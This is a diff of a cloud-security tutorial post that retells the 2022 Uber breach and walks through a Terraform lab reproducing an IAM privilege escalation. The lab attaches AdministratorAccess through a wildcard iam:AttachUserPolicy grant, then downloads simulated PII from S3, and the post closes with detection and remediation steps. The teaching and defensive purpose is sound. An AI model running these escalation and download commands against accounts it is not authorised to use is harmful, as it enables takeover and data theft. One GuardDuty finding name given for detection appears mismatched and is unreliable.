@@ -1,89 +1,55 @@
 # Case #02 — IAM Privilege Escalation: How an 18-Year-Old Took Over Uber's AWS
 
-> **🔪 The AWS Autopsy** | Dissecting real cloud breaches with hands-on Terraform labs
-> **Series:** [awsautopsy.hashnode.dev](https://awsautopsy.hashnode.dev) | **GitHub:** [github.com/ridamdarji25/AWS-Autopsy](https://github.com/ridamdarji25/AWS-Autopsy)
+> **Series:** The AWS Autopsy — Real Cloud Breaches, Dissected
+> **Difficulty:** Intermediate
+> **Lab Time:** ~45 minutes
+> **AWS Cost:** Near zero (t2.micro — free tier eligible)
+>
+> **GitHub:** [AWS-Autopsy | Case #02](https://github.com/ridamdarji25/AWS-Autopsy/tree/main/Case-02-IAM-PrivEsc-Uber)
 
 ---
 
-## Introduction
+## ⚠️ Legal & Ethical Disclaimer
 
-In September 2022, an 18-year-old hacker compromised Uber's entire cloud infrastructure. They accessed S3 buckets containing rider PII, EC2 instances across regions, internal dashboards, company Slack, and most critically — Uber's private HackerOne bug bounty reports, which contained a map of every unpatched vulnerability in their systems.
+**Read this before proceeding.**
 
-No zero-days were used. No nation-state-level tooling. The attack succeeded because of three compounding mistakes that exist in thousands of AWS environments right now:
+This article and the accompanying lab are created **strictly for educational and defensive security research purposes.**
 
-1. MFA implemented using push notifications (susceptible to fatigue attacks)
-2. Credentials hardcoded in a PowerShell script on a shared network drive
-3. IAM policies with wildcard `iam:AttachUserPolicy` permissions
+- ✅ Run this lab **only** on AWS infrastructure you personally own
+- ✅ This is intended to help security professionals **understand and defend** against real attack vectors
+- ❌ Do **not** use any technique shown here on systems you do not own
+- ❌ Do **not** use this for any malicious, unauthorized, or illegal activity
+- ❌ Unauthorized access to computer systems is a **criminal offense** in most countries
 
-In this post we'll dissect the full attack chain and then replicate the IAM privilege escalation vector in a hands-on Terraform lab.
+By continuing, you agree that you are using this content solely for ethical security research and education.
 
----
-
-## The Breach — Full Kill Chain
-
-### Phase 1: MFA Fatigue Attack
-
-The attacker obtained an Uber contractor's credentials — likely through a combination of phishing and credential stuffing from previous data leaks. Uber used MFA, so credentials alone were not enough.
-
-The technique used was **MFA fatigue** (also called MFA push bombing):
-
-1. The attacker triggered repeated MFA push notifications to the contractor's phone
-2. After dozens of denials, the contractor grew confused and fatigued
-3. The attacker texted the contractor directly, impersonating Uber IT support: *"We're seeing suspicious activity on your account. To stop it, please approve the next verification request."*
-4. The contractor approved it
-5. The attacker was inside Uber's VPN
-
-📸 [ADD SCREENSHOT HERE — MFA fatigue attack flow diagram]
-
-**Why this works:** Push-based MFA places the entire security decision on a tired, non-technical employee receiving a notification. When paired with social engineering, it is trivially bypassed.
-
-**The fix:** Hardware security keys (YubiKey), FIDO2 passkeys, or number-matching MFA make fatigue attacks impossible.
+> The author takes no responsibility for any misuse of the information presented in this article.
 
 ---
 
-### Phase 2: Hardcoded Credentials in a PowerShell Script
+## The Victim
 
-Once inside the VPN, the attacker explored internal network shares — essentially shared folders accessible to Uber employees on the intranet.
-
-They found a PowerShell automation script used by IT/DevOps. Inside that script:
-
-```powershell
-# PAM Configuration
-$pamUsername = "svc-admin"
-$pamPassword = "Uber@Internal2022!"
-$pamEndpoint = "https://internal-pam.uber.com/api/v1"
-```
-
-A developer had hardcoded PAM (Privileged Access Manager) credentials directly into the script and stored it on a shared drive. This is one of the most common and most catastrophic mistakes in enterprise environments.
-
-📸 [ADD SCREENSHOT HERE — Example of hardcoded credential in script]
-
-**Why this is devastating:** PAM systems are specifically designed to hold the most privileged credentials in an organization. They are the master key vault. Leaving the vault key in a plaintext file on a shared drive negates the entire purpose of having a PAM system.
+| Field | Details |
+|---|---|
+| **Organisation** | Uber Technologies, Inc. |
+| **Date** | September 2022 |
+| **Attacker** | 18-year-old threat actor (alias: "teapotuberhacker") |
+| **Data Exposed** | Rider PII, financial records, internal dashboards, HackerOne private bug reports |
+| **Root Cause** | MFA fatigue + hardcoded PAM credentials + wildcard `iam:AttachUserPolicy` |
+| **Attack Complexity** | LOW |
+| **Preventability** | 100% |
 
 ---
 
-### Phase 3: PAM Vault Unlocked
+## The Story
 
-With the hardcoded credentials, the attacker authenticated to Uber's Privileged Access Manager and found:
+Most people assume a full cloud takeover requires a nation-state actor, a zero-day, or months of reconnaissance.
 
-| Credential Type | Access Level |
-|----------------|-------------|
-| AWS IAM keys | Admin-level |
-| GCP service account keys | Admin-level |
-| Google Workspace | Super Admin |
-| Windows Domain Admin | Full internal AD |
+Uber's entire AWS environment was compromised in an afternoon. By an 18-year-old. Using three mistakes that exist in thousands of environments right now.
 
-Every crown jewel. All in one place. No additional MFA protecting individual secrets.
+The attacker obtained a contractor's credentials, bypassed push-based MFA through fatigue and social engineering, discovered hardcoded PAM credentials on an internal network share, and used those to unlock Uber's Privileged Access Manager — which held admin-level IAM keys for AWS.
 
-📸 [ADD SCREENSHOT HERE — PAM architecture diagram showing credential storage]
-
----
-
-### Phase 4: IAM Privilege Escalation
-
-With the AWS keys from PAM, the attacker now had IAM-level access to Uber's AWS environment. The keys belonged to a user or role with overly permissive IAM policies — specifically, the ability to attach any IAM policy to any user.
-
-The attack was a single AWS CLI command:
+With those keys, a single AWS CLI command was all it took:
 
 ```bash
 aws iam attach-user-policy \
@@ -91,148 +57,209 @@ aws iam attach-user-policy \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
-This attached AWS managed `AdministratorAccess` — full permissions on every service in every region — to the attacker's own user. From low-privilege to god-mode in under 15 seconds.
+Low-privilege user → god-mode. Under 15 seconds.
 
-📸 [ADD SCREENSHOT HERE — IAM escalation path diagram: AttachUserPolicy abuse]
-
-The specific permission that enabled this is `iam:AttachUserPolicy` scoped to `Resource: "*"`. It is one of several IAM privilege escalation paths documented by security researchers. Others include:
-
-- `iam:CreatePolicyVersion` — overwrite an existing policy with an admin version
-- `iam:PassRole` + `ec2:RunInstances` — launch EC2 with an admin role attached
-- `iam:CreateAccessKey` — generate new keys for an existing admin user
+Then they posted the breach announcement in Uber's own `#announcements` Slack channel. Employees thought it was a prank — until they checked their systems.
 
 ---
 
-### Phase 5: The Blast Radius
+## The Kill Chain
 
-With `AdministratorAccess`:
-
-**S3:** Rider PII, financial data, internal documents
-**EC2:** Backend services, internal tooling
-**HackerOne:** Private bug reports — a complete list of every unpatched vulnerability Uber had at that moment. This was arguably the most dangerous data accessed.
-**Slack:** Full company communications, strategy discussions, sensitive conversations
-**Internal dashboards:** Analytics, operations, monitoring
-
-📸 [ADD SCREENSHOT HERE — Blast radius diagram showing all compromised services]
-
-The attacker then announced the breach in Uber's #announcements Slack channel. Employees initially dismissed it as a prank. Then they started checking systems.
-
-Uber took down Slack, internal tools, and engineering systems while incident response was engaged.
-
----
-
-## The Hands-On Lab
-
-Now let's replicate the IAM privilege escalation in our own AWS environment using Terraform.
-
-### What We Build
-
-```
-attacker-user (low-priv)           sensitive-bucket (restricted)
-      |                                     |
-      | has iam:AttachUserPolicy            | contains simulated PII
-      | on Resource: *                      | financial records
-      |                                     | HackerOne-style vuln data
-      v                                     |
- EXPLOIT: attach AdministratorAccess -------> PROFIT: full bucket access
+```plaintext
+[Attacker]
+    │
+    │  Step 1: Credential stuffing / phishing → contractor creds obtained
+    ▼
+[MFA Push Fatigue + Social Engineering]
+    │
+    │  Repeated push bombs → contractor approves → VPN access gained
+    ▼
+[Internal Network Share — PowerShell Script]
+    │
+    │  Hardcoded PAM credentials found in plaintext script
+    ▼
+[PAM Vault — Privileged Access Manager]
+    │
+    │  Admin AWS IAM keys, GCP keys, Google Workspace, AD — all unlocked
+    ▼
+[AWS IAM — iam:AttachUserPolicy on Resource: *]
+    │
+    │  attach-user-policy AdministratorAccess → instant privilege escalation
+    ▼
+[Full AWS Account — AdministratorAccess]
+    │
+    │  ListBuckets → GetObject → full S3 exfiltration
+    ▼
+[Blast Radius: Rider PII + Financial Data + HackerOne Reports + Slack]
 ```
 
-### Prerequisites
-
-- AWS account (Free Tier sufficient)
-- Terraform >= 1.3.0
-- AWS CLI v2 configured with an admin profile for initial setup
+**Attack Complexity:** LOW
+**Preventability:** 100%
 
 ---
 
-### Step 1: Deploy the Lab
+## Lab Architecture
+
+This lab isolates and replicates the IAM privilege escalation vector from the Uber breach:
+
+- **`yourname-attacker-user`** — a low-privilege IAM user with one dangerous permission: `iam:AttachUserPolicy` on `Resource: *`
+- **`yourname-sensitive-bucket`** — a private S3 bucket containing simulated PII, financial records, and a mock HackerOne-style vulnerability list
+- **`yourname-permission-boundary`** — a boundary policy pre-built for the remediation phase (Fix 2)
+- **`yourname-attacker-policy`** — the vulnerable IAM policy attached to the attacker user
+
+> Starting state: the attacker user has zero S3 access. One IAM command changes everything.
+
+📸 *[Lab architecture diagram — add screenshot here]*
+
+---
+
+## Prerequisites
+
+- AWS account (free tier works)
+- AWS CLI v2 configured (`aws configure`) with an admin profile for initial setup
+- Terraform v1.3+ installed
+- Basic familiarity with IAM and S3
+
+---
+
+## Part 1 — Lab Setup
+
+> **Clone the repository:**
 
 ```bash
 git clone https://github.com/ridamdarji25/AWS-Autopsy.git
-cd AWS-Autopsy/Case-02-IAM-PrivEsc-Uber/LabSetup
+cd AWS-Autopsy/Case-02-IAM-PrivEsc-Uber/terraform
+```
 
+📸 *[Screenshot: repo cloned, directory structure visible]*
+
+---
+
+> **Open `terraform.tfvars` and set your unique prefix:**
+
+```hcl
+prefix     = "yourname"   # ← change this to your name (e.g. "ridam")
+aws_region = "us-east-1"
+```
+
+Why prefix? Every resource uses your prefix — `yourname-attacker-user`, `yourname-sensitive-bucket`, `yourname-attacker-policy` — so there are no naming conflicts if multiple people run the lab simultaneously.
+
+📸 *[Screenshot: terraform.tfvars open with prefix set]*
+
+---
+
+> **Deploy the lab:**
+
+```bash
 terraform init
 terraform plan
 terraform apply
 ```
 
-📸 [ADD SCREENSHOT HERE — terraform apply output showing resources created]
+Type `yes` when prompted.
+
+📸 *[Screenshot: terraform apply output — resources created]*
 
 ---
 
-### Step 2: Configure the Attacker Profile
+> **Note the outputs:**
+
+```plaintext
+attacker_access_key_id      = "AKIA5XXXXXXXXXXXXXXXXX"
+attacker_secret_access_key  = <sensitive>
+sensitive_bucket_name       = "yourname-sensitive-bucket"
+attacker_user_name          = "yourname-attacker-user"
+attacker_policy_arn         = "arn:aws:iam::123456789012:policy/yourname-attacker-policy"
+permission_boundary_arn     = "arn:aws:iam::123456789012:policy/yourname-permission-boundary"
+```
+
+---
+
+> **Configure the attacker AWS profile:**
 
 ```bash
 # Get the secret key
 terraform output -raw attacker_secret_access_key
 
-# Configure the attacker AWS profile
+# Configure the attacker profile
 aws configure --profile attacker
-# AWS Access Key ID: (from terraform output attacker_access_key_id)
+# AWS Access Key ID:     (from terraform output attacker_access_key_id)
 # AWS Secret Access Key: (from command above)
-# Default region name: us-east-1
+# Default region name:   us-east-1
 # Default output format: json
 ```
 
+📸 *[Screenshot: aws configure --profile attacker completed]*
+
 ---
 
-### Step 3: Verify Identity — You Are Nobody
+## Part 2 — The Attack
+
+> ⚠️ Perform these steps only on your own lab. This is your infrastructure, your account.
+
+---
+
+### Step 1 — Verify Identity: You Are Nobody
 
 ```bash
 aws sts get-caller-identity --profile attacker
 ```
 
 Expected output:
+
 ```json
 {
     "UserId": "AIDAXXXXXXXXXXXXXXXXX",
     "Account": "123456789012",
-    "Arn": "arn:aws:iam::123456789012:user/w1tn3sss-attacker-user"
+    "Arn": "arn:aws:iam::123456789012:user/yourname-attacker-user"
 }
 ```
 
-📸 [ADD SCREENSHOT HERE — get-caller-identity output showing attacker-user]
+A low-privilege user. No meaningful access. Yet.
+
+📸 *[Screenshot: get-caller-identity output showing attacker-user]*
 
 ---
 
-### Step 4: Confirm No Access to Sensitive Bucket
+### Step 2 — Confirm No Access to Sensitive Bucket
 
 ```bash
-aws s3 ls s3://w1tn3sss-sensitive-bucket --profile attacker
+aws s3 ls s3://yourname-sensitive-bucket --profile attacker
 ```
 
 Expected output:
-```
+
+```plaintext
 An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
 ```
 
-📸 [ADD SCREENSHOT HERE — Access Denied on sensitive bucket]
+This is the starting state. The attacker can't touch the bucket.
 
-This is the starting state. The attacker is a nobody with no meaningful access.
+📸 *[Screenshot: Access Denied on sensitive bucket]*
 
 ---
 
-### Step 5: Enumerate Permissions
+### Step 3 — Enumerate Permissions
 
 ```bash
 aws iam list-attached-user-policies \
-  --user-name w1tn3sss-attacker-user \
+  --user-name yourname-attacker-user \
   --profile attacker
 ```
 
-📸 [ADD SCREENSHOT HERE — list-attached-user-policies output]
+📸 *[Screenshot: list-attached-user-policies output]*
 
-You'll see `w1tn3sss-attacker-policy` attached. To inspect its permissions:
+Inspect the policy contents:
 
 ```bash
-# Get policy ARN from the output above, then:
+# Use the policy ARN from the output above
 aws iam get-policy-version \
-  --policy-arn <policy-arn> \
+  --policy-arn <policy-arn-from-output> \
   --version-id v1 \
   --profile attacker
 ```
 
-Buried in the policy statements, you'll find:
+Buried in the policy statements:
 
 ```json
 {
@@ -243,52 +270,165 @@ Buried in the policy statements, you'll find:
 }
 ```
 
-There it is. `iam:AttachUserPolicy` on `Resource: *`. That's the loaded gun.
+There it is. `iam:AttachUserPolicy` scoped to `Resource: *`.
+That's the loaded gun.
+
+📸 *[Screenshot: policy document showing iam:AttachUserPolicy on Resource:*]*
 
 ---
 
-### Step 6: EXPLOIT — Attach AdministratorAccess
+### Step 4 — EXPLOIT: Attach AdministratorAccess
 
 ```bash
 aws iam attach-user-policy \
-  --user-name w1tn3sss-attacker-user \
+  --user-name yourname-attacker-user \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
   --profile attacker
 ```
 
-No error. No confirmation prompt. It just works.
+No error. No confirmation. No alarm.
 
-📸 [ADD SCREENSHOT HERE — attach-user-policy command succeeding]
+It just works.
+
+📸 *[Screenshot: attach-user-policy command succeeding silently]*
 
 ---
 
-### Step 7: Access the Sensitive Bucket
+### Step 5 — Verify the Escalation
+
+```bash
+aws iam list-attached-user-policies \
+  --user-name yourname-attacker-user \
+  --profile attacker
+```
+
+`AdministratorAccess` is now attached alongside the original policy. Same user. Same session. Full admin.
+
+📸 *[Screenshot: AdministratorAccess now listed in attached policies]*
+
+---
+
+### Step 6 — Access the Sensitive Bucket
 
 ```bash
 # List the bucket
-aws s3 ls s3://w1tn3sss-sensitive-bucket --profile attacker
+aws s3 ls s3://yourname-sensitive-bucket --profile attacker
 
-# Download financial data
-aws s3 cp s3://w1tn3sss-sensitive-bucket/financial/q3-2022-revenue.txt . --profile attacker
-
-# Download the PII
-aws s3 cp s3://w1tn3sss-sensitive-bucket/rider-pii/user-data-2022.csv . --profile attacker
-
-# Download the vuln list
-aws s3 cp s3://w1tn3sss-sensitive-bucket/security/unpatched-vulns.txt . --profile attacker
+# List recursively
+aws s3 ls s3://yourname-sensitive-bucket --recursive --profile attacker
 ```
 
-📸 [ADD SCREENSHOT HERE — successful S3 access after escalation]
+Expected output:
 
-Full access. Same account. Same user. One command changed everything.
+```plaintext
+2024-01-01 10:00:00    204 financial/q3-2022-revenue.txt
+2024-01-01 10:00:00    512 rider-pii/user-data-2022.csv
+2024-01-01 10:00:00    318 security/unpatched-vulns.txt
+```
+
+📸 *[Screenshot: full S3 listing now accessible after escalation]*
 
 ---
 
-## Remediation
+### Step 7 — Download and View the Stolen Data
 
-### Fix 1: Remove Wildcard from iam:AttachUserPolicy
+```bash
+# Download all files
+aws s3 cp s3://yourname-sensitive-bucket/financial/q3-2022-revenue.txt . --profile attacker
+aws s3 cp s3://yourname-sensitive-bucket/rider-pii/user-data-2022.csv . --profile attacker
+aws s3 cp s3://yourname-sensitive-bucket/security/unpatched-vulns.txt . --profile attacker
+
+# View the data
+cat q3-2022-revenue.txt
+cat user-data-2022.csv
+cat unpatched-vulns.txt
+```
+
+📸 *[Screenshot: downloaded files and contents visible — PII, financial data, vuln list]*
+
+---
+
+> **💀 Attack complete.**
+
+One permission. One command. Zero malware. Zero exploits.
+
+In the real Uber breach — HackerOne private bug reports, internal Slack, rider PII across regions. All of it.
+
+---
+
+## Part 3 — Detection
+
+What should have caught this?
+
+### GuardDuty — Privilege Escalation Finding
+
+GuardDuty raises:
+
+`Policy:IAMUser/RootCredentialUsage` and `PrivilegeEscalation:IAMUser/AdministrativePermissions`
+
+These fire when unusual IAM permission changes are detected — specifically self-service policy attachments outside normal admin workflows.
+
+```bash
+# Enable GuardDuty
+aws guardduty create-detector --enable --region us-east-1
+```
+
+---
+
+### CloudTrail — What to Look For
+
+In CloudTrail, look for:
+
+- `AttachUserPolicy` events where the caller and target user are the **same principal**
+- `AttachUserPolicy` events attaching AWS managed policies (`aws:policy/AdministratorAccess`, `aws:policy/PowerUserAccess`)
+- Any IAM write event from an unexpected source IP or at an unexpected time
+
+---
+
+### CloudTrail Athena Query
+
+```sql
+SELECT
+  eventTime,
+  userIdentity.arn,
+  sourceIPAddress,
+  eventName,
+  requestParameters
+FROM cloudtrail_logs
+WHERE
+  eventSource = 'iam.amazonaws.com'
+  AND eventName = 'AttachUserPolicy'
+  AND requestParameters LIKE '%AdministratorAccess%'
+ORDER BY eventTime DESC
+LIMIT 50;
+```
+
+Any `AttachUserPolicy` call targeting `AdministratorAccess` from a non-admin principal is a **critical red flag**.
+
+### IAM Access Analyzer
+
+IAM Access Analyzer would have flagged `iam:AttachUserPolicy` on `Resource: *` **before** any attacker ever had the chance to use it.
+
+```bash
+aws accessanalyzer create-analyzer \
+  --analyzer-name autopsy-case02-analyzer \
+  --type ACCOUNT
+```
+
+It scans all IAM policies automatically and surfaces privilege escalation paths as findings.
+
+---
+
+## Part 4 — Remediation
+
+Three fixes. All minimal changes in Terraform.
+
+---
+
+### Fix 1 — Remove Wildcard from `iam:AttachUserPolicy`
 
 **Before (vulnerable):**
+
 ```json
 {
   "Effect": "Allow",
@@ -298,6 +438,7 @@ Full access. Same account. Same user. One command changed everything.
 ```
 
 **After (fixed):**
+
 ```json
 {
   "Effect": "Allow",
@@ -306,22 +447,28 @@ Full access. Same account. Same user. One command changed everything.
 }
 ```
 
-Only allow attaching policies to specific, explicitly named users. Never `*`.
+Scope IAM write actions to explicit, named resources. Never `*`.
+
+In `iam.tf`, update the `Resource` field and apply:
+
+```bash
+terraform apply
+```
 
 ---
 
-### Fix 2: Apply a Permission Boundary
+### Fix 2 — Apply a Permission Boundary (Kills the Attack Completely)
 
-Permission boundaries are an IAM feature that set the **maximum** permissions a user can ever have — regardless of what policies are attached to them.
+Permission boundaries set the **maximum** permissions a user can ever hold — regardless of what policies are attached. Even if an attacker attaches `AdministratorAccess`, the boundary overrides it.
 
 ```bash
-# Apply the permission boundary from our Terraform outputs
+# Apply the pre-built boundary from Terraform outputs
 aws iam put-user-permissions-boundary \
-  --user-name w1tn3sss-attacker-user \
-  --permissions-boundary arn:aws:iam::123456789012:policy/w1tn3sss-permission-boundary
+  --user-name yourname-attacker-user \
+  --permissions-boundary arn:aws:iam::123456789012:policy/yourname-permission-boundary
 ```
 
-The boundary policy explicitly **denies** all IAM write actions:
+The boundary policy explicitly denies all IAM write actions:
 
 ```json
 {
@@ -339,71 +486,78 @@ The boundary policy explicitly **denies** all IAM write actions:
 }
 ```
 
-Even if a policy grants `iam:AttachUserPolicy`, the boundary overrides it. The escalation path is closed.
+Now repeat Step 4 of the attack — you'll get `AccessDenied`. The escalation path is permanently closed.
 
-📸 [ADD SCREENSHOT HERE — attach-user-policy now returning Access Denied after boundary applied]
+📸 *[Screenshot: attach-user-policy returning Access Denied after boundary applied]*
 
 ---
 
-### Fix 3: Enable IAM Access Analyzer
+### Fix 3 — IAM Access Analyzer + CloudTrail Always On
 
-IAM Access Analyzer automatically scans your IAM policies and flags privilege escalation paths, overly permissive policies, and external access.
+```hcl
+# accessanalyzer.tf
+resource "aws_accessanalyzer_analyzer" "main" {
+  analyzer_name = "autopsy-case02-analyzer"
+  type          = "ACCOUNT"
+}
 
-```bash
-aws accessanalyzer create-analyzer \
-  --analyzer-name uber-case-analyzer \
-  --type ACCOUNT
+# cloudtrail.tf
+resource "aws_cloudtrail" "autopsy_trail" {
+  name                          = "autopsy-trail"
+  s3_bucket_name                = aws_s3_bucket.trail_logs.id
+  include_global_service_events = true
+  is_multi_region_trail         = true
+  enable_log_file_validation    = true
+}
 ```
-
-It would have detected `iam:AttachUserPolicy` on `Resource: *` and flagged it before any attacker ever had the chance.
-
-📸 [ADD SCREENSHOT HERE — IAM Access Analyzer findings dashboard]
 
 ---
 
 ### Verify the Fix
 
 ```bash
-# Detach AdministratorAccess first (cleanup from exploit)
+# Clean up the exploit first
 aws iam detach-user-policy \
-  --user-name w1tn3sss-attacker-user \
+  --user-name yourname-attacker-user \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 
-# Try the exploit again
+# Attempt the exploit again
 aws iam attach-user-policy \
-  --user-name w1tn3sss-attacker-user \
+  --user-name yourname-attacker-user \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
   --profile attacker
 # Expected: An error occurred (AccessDenied)
 ```
 
-📸 [ADD SCREENSHOT HERE — exploit attempt now returning Access Denied]
+📸 *[Screenshot: exploit attempt returning Access Denied after fix]*
 
 Attack path closed.
 
 ---
 
-## Cleanup
+## Cleanup — Important
 
 ```bash
 terraform destroy
 ```
 
-This removes all IAM users, roles, policies, and S3 buckets created by the lab.
+This removes all IAM users, policies, boundaries, and S3 buckets created by the lab.
+
+📸 *[Screenshot: terraform destroy output — all resources removed]*
 
 ---
 
-## Key Takeaways
+## The 5 Lessons from Case #02
 
-**1. `iam:AttachUserPolicy` on `Resource: *` is a privilege escalation path, not just a misconfiguration.** Any user with this permission can make themselves an administrator. Treat it like root access.
+**1/ `iam:AttachUserPolicy` on `Resource: *` is privilege escalation, not just a misconfiguration.** Any user with this permission can make themselves an administrator. Treat it like handing someone the root password.
 
-**2. Permission boundaries are your safety net.** They cap the blast radius of any IAM misconfiguration. Deploy them as organizational policy for all non-admin users.
+**2/ Permission boundaries are your safety net.** They cap the blast radius of any IAM misconfiguration. Deploy them as organisational policy for all non-admin users — especially service accounts and automation users.
 
-**3. IAM Access Analyzer is free and catches these paths automatically.** There is no excuse for not enabling it in every account.
+**3/ IAM Access Analyzer is free and catches these paths automatically.** There is no excuse for not enabling it in every account. It would have flagged this before any attacker found it.
 
-**4. Hardcoded credentials are a single file discovery away from full compromise.** Use AWS Secrets Manager. Use Parameter Store. Run `git-secrets` in your CI pipeline. Never hardcode.
+**4/ Hardcoded credentials are a single file discovery away from full compromise.** Use AWS Secrets Manager. Use Parameter Store. Run `git-secrets` in your CI pipeline. Never hardcode credentials — not in scripts, not in config files, not in comments.
 
-**5. MFA fatigue is solved by hardware keys, not user education.** FIDO2 passkeys and hardware tokens are phishing and fatigue-proof by design. Push-based MFA is not.
+**5/ Push-based MFA is not phishing-proof.** MFA fatigue is trivially executed. FIDO2 passkeys and hardware security keys (YubiKey) are immune by design. If your organisation uses push notifications as the only MFA factor, you are one social engineering call away from a breach.
 
 ---
 
@@ -411,12 +565,32 @@ This removes all IAM users, roles, policies, and S3 buckets created by the lab.
 
 **Case #03 — Secrets Leaked on GitHub (Toyota + Multiple Orgs)**
 
-How hardcoded AWS keys in public GitHub repos led to mass data exposure — and how to detect and prevent it with GitGuardian, AWS Macie, and automated secret scanning.
+> *A developer committed AWS keys to a public repo.*
+> *They deleted the commit 5 minutes later.*
+> *By then — it was already over.*
+> *This is how mass cloud credential exposure happens, and how to stop it.*
 
-Follow along: [awsautopsy.hashnode.dev](https://awsautopsy.hashnode.dev)
-GitHub: [github.com/ridamdarji25/AWS-Autopsy](https://github.com/ridamdarji25/AWS-Autopsy)
-LinkedIn: [linkedin.com/in/ridamdarji](https://linkedin.com/in/ridamdarji)
+Follow on [LinkedIn](https://linkedin.com/in/ridamdarji) and [Hashnode](https://awsautopsy.hashnode.dev) so you don't miss it.
+
+⭐ **Star the repo** to get notified when Case #03 drops → [github.com/ridamdarji25/AWS-Autopsy](https://github.com/ridamdarji25/AWS-Autopsy)
 
 ---
 
-*Ridam Darji — AWS Builder Community | Cloud Security Practitioner*
+## References
+
+- [Uber Security Incident — Official Statement (2022)](https://www.uber.com/newsroom/security-update/)
+- [AWS IAM Privilege Escalation Paths — Rhino Security Labs](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
+- [AWS IAM Permission Boundaries Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html)
+- [AWS IAM Access Analyzer Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html)
+- [GuardDuty IAM Finding Types](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html)
+- [MITRE ATT&CK — Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/)
+
+---
+
+*The AWS Autopsy is an educational series on real cloud security incidents. Every technique demonstrated is for defensive security research only. Always obtain proper authorisation before testing any system you do not own.*
+
+*Found this useful? Share it with your team. Every AWS engineer should run this lab at least once.*
+
+---
+
+**Tags:** `aws` `cloud-security` `ethical-hacking` `terraform` `devsecops` `iam` `privilege-escalation` `security-research`
